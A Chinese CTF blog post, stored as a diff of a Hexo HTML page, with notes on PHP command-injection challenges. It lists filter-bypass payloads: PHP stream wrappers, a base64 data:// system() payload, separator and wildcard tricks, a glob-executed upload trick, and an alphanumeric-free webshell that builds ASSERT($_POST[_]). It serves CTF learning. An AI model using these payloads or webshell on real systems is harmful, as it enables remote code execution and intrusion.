@@ -1,0 +1,240 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CTF命令执行漏洞的一些杂七杂八的笔记 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="命令执行漏洞主要是由system、exec、shell_exec，eval等函数能把用户输入的内容当作是命令来执,反引号一般的作用是与system类似，都是把内容作为命令来执行。//不过在这些命令执,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">CTF命令执行漏洞的一些杂七杂八的笔记</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">CTF命令执行漏洞的一些杂七杂八的笔记</h1>
+        <div class="stuff">
+            <span>四月 28, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>命令执行漏洞主要是由system、exec、shell_exec，eval等函数能把用户输入的内容当作是命令来执,反引号一般的作用是与system类似，都是把内容作为命令来执行。//不过在这些命令执行函数里面，只有system是有回显的，其他的函数都需要搭配着echo来使用</p>
+<h4 id="关于过滤的一些笔记"><a href="#关于过滤的一些笔记" class="headerlink" title="关于过滤的一些笔记"></a>关于过滤的一些笔记</h4><p>一般看到有过滤的我都会直接先用<code>echo &quot;npfs &quot;; include($_GET[&#39;url&#39;]); ?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code>这个来试试水</p>
+<p><code>eval(system(&#39;cat flag.php&#39;);</code>这段代码的system可以换成是反引号，如果cat被过滤了就可以把cat换成是其他可以查看flag.php的函数，如<code>nl</code> ，如果flag.php也被过滤了可以把flag.php分开拼接如<code>f&#39;&#39;l&#39;&#39;a&#39;&#39;g.php</code>，还可以通配符<code>f*</code> 或者<code>f?ag.php</code></p>
+<h4 id="一些绕过的方法"><a href="#一些绕过的方法" class="headerlink" title="一些绕过的方法"></a>一些绕过的方法</h4><p>空格绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符&#x2F;&#x2F;这里有一点需注意用&lt;&gt;的时候和通配符?是没有回显的可以用\</span><br><span class="line">&#x2F;&#x2F;比如 tac&lt;&gt;fla？.php要改为tac&lt;&gt;fla\g.php</span><br><span class="line">%09(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line">&#x2F;**&#x2F;（一般在sql注入的时候使用）</span><br></pre></td></tr></table></figure>
+
+<p>cat被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h5 id="grep的使用"><a href="#grep的使用" class="headerlink" title="grep的使用"></a>grep的使用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>无须括号的函数(php)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo qwer;</span><br><span class="line">print qwe;</span><br><span class="line">die;</span><br><span class="line">include &quot;&#x2F;dasdasda&quot;;</span><br><span class="line">require &quot;&#x2F;asdasdas&quot;;</span><br><span class="line">include_once &quot;&#x2F;asdasd&quot;;</span><br><span class="line">require_once &quot;&#x2F;aaaaaa&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="我常用的俩协议"><a href="#我常用的俩协议" class="headerlink" title="我常用的俩协议"></a>我常用的俩协议</h4><p><code>php://filter/</code></p>
+<p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=</code></p>
+<p>当上面的东西用不出来的时候就试试这俩吧</p>
+<p>如果还出不来怎么办呢</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13778333.html">https://www.cnblogs.com/NPFS/p/13778333.html</a></p>
+<p>去看看大佬写的这篇无参数文件读取吧</p>
+<p>看完以后你就可以知道scandir(current(localeconv()))的妙用（不得不说站在巨人的肩膀上看世界真的方便了像我这种小菜鸡</p>
+<p>嘿嘿这里有一道题可以用到这个</p>
+<p><img src="C:\Users\D\Pictures\ctfshow\QQ图片20210206203238.png"></p>
+<p>这道题就是上面的方法都试过之后都没有用然后就用到scandir(current(localeconv()))来查看文件</p>
+<p><code>print_r(scandir(current(localeconv())));</code></p>
+<p><img src="C:\Users\D\Pictures\ctfshow\QQ图片20210206203846.png"></p>
+<p>看到了flag.php 我们想要打开它，但是又不能出现数字怎么办呢。</p>
+<p>当然是通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，记得成功读取flag.php文件</p>
+<p>paylaod<code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
+<p>如果在命令执行函数输入的内容的后面或者前面拼接了其他的函数来影响我们的执行内容可以用命令分隔符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;	&#x2F;&#x2F;分号</span><br><span class="line">|	&#x2F;&#x2F;只执行后面那条命令</span><br><span class="line">||	&#x2F;&#x2F;只执行前面那条命令</span><br><span class="line">&amp;	&#x2F;&#x2F;两条命令都会执行</span><br><span class="line">&amp;&amp;	&#x2F;&#x2F;两条命令都会执行</span><br><span class="line">%0a</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他的骚操作"><a href="#其他的骚操作" class="headerlink" title="其他的骚操作"></a>其他的骚操作</h3><p>因为Linux的命令可以用通配符来使用如果好多东西都被过滤了就可以使用这一特性来去绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个可以利用/bin/base64 来查看flag</p>
+<p>比如<code>c=/???/????64%20????.???</code></p>
+<p>还有就是在p神那里学到的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<p>主要是利用shell下可以用.来执行任意脚本，和linux文件名支持用global通篇日服来代替</p>
+<p>我们上传的默认文件名是/tmp/phpxXXXXXX 文件最后六个字符是随机的大小写字母</p>
+<p>在通配符里面<code>[@-[]</code>来表示大写字母</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以开整</p>
+<p>按照p神的方法来</p>
+<ol>
+<li>首先构造一个POST上传文件包</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>上传一个php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure></li>
+<li><p>抓包以后把<code>c=./???/????????[@-[]</code>加上去就好</p>
+</li>
+</ol>
+<p>有一个凑数字的技巧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;_&#125;&#x3D;&quot;&quot;&#96;</span><br><span class="line"> &#96;$(($&#123;_&#125;))&#x3D;0&#96;</span><br><span class="line"> &#96;$((~$(($&#123;_&#125;))))&#x3D;-1</span><br></pre></td></tr></table></figure>
+
+<p>利用这个可以凑出我们想要的数字</p>
+<p>用这个可以看到目录文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>p神无字母数字执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++; &#x2F;&#x2F; E </span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
